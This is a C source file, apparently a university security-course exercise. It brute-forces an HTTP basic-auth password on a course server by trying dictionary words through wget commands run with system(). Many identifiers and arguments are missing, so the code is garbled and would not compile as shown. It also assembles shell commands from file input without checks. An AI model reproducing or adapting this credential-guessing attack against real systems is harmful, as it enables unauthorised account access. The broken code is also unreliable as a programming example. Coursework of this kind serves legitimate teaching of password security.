#include<stdio.h>
#include<stdlib.h>
#include<strings.h>
#include<ctype.h>
#include <sys/time.h>
#define OneBillion 1e9

int ()
{   int startTime, stopTime, final;
    int i,j,k;
    FILE* fp;
    int pass,len;
    int count = 0;
    char [50];
    char url1[100];
    char url2[100];

    startTime = time();
    fp = fopen("/usr/share/lib/dict/words","r");
    while (fp !='\0')
     {
       fgets( ,50,fp);

       len = strlen();
       [strlen()-1] ='\0';

       if(len <= 4)
       {
         count++;
	     printf("Checking for the word :%s\n",);
	     strcpy(url1 ,"wget --http-user= --http-passwd=");
	     strcat(url1,);
	     strcpy(url2 , " -nv -o output http://sec-crack.cs.rmit.edu./SEC/2/ ");
	     strcat(url1,url2);


	     pass = system(url1);
	    if (pass == 0)
	    {
	      stopTime = time();
          final = stopTime-startTime;
	      printf("\n SUCCESS\n");
	      printf("The password for the user  : %s\n ",);
	      printf("Found the password in %lld nanoseconds (%1f seconds) \n",final,(double)final/OneBillion);
	       printf("Number of attempts : %d\n",count);
          exit(1);
	 }
        }
       }

 }
